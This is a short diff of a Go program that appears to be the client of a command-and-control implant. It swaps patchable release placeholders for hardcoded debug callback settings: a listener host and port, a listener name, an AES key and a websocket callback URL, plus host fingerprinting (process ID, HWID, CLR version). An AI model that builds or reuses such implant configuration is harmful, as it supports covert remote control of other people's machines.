@@ -160,24 +160,24 @@ var ClientWorking bool
 
 func main() {
 	//release
-	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
-	Port := "PortAAAABBBBCCCCDDDD"
-	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
-	route := "RouteAAAABBBBCCCCDDDD"
-	PcInfo.AesKey = "AeskAAAABBBBCCCC"
-	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	// Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
+	// Port := "PortAAAABBBBCCCCDDDD"
+	// ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	// route := "RouteAAAABBBBCCCCDDDD"
+	// PcInfo.AesKey = "AeskAAAABBBBCCCC"
+	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
+	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	//PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
 	PcInfo.ProcessID = PcInfo.GetProcessID()
 	PcInfo.HWID = PcInfo.GetHWID()
 	PcInfo.ClrVersion = getClrVersion()
 
 	///Debug
-	// Host := "192.168.1.4"
-	// Port := "4000"
-	// PcInfo.ListenerName = "asd"
-	// PcInfo.AesKey = "QWERt_CSDMAHUATW"
-	// route := "www"
+	Host := "10.211.55.4"
+	Port := "4000"
+	PcInfo.ListenerName = "asd"
+	PcInfo.AesKey = "QWERt_CSDMAHUATW"
+	route := "www"
 	// // //url := "ws://www.sftech.shop:443//www"
 	url := "ws://" + Host + ":" + Port + "/" + route
 
